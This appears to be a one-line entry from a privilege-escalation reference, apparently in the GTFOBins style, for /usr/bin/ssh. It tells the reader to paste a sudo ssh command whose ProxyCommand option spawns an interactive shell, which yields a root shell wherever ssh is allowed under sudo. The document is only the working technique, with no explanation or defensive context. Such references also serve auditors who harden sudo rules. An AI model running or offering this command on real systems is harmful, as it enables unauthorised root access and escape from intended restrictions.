#### /usr/bin/ssh

Paste this in without modification
``` bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```


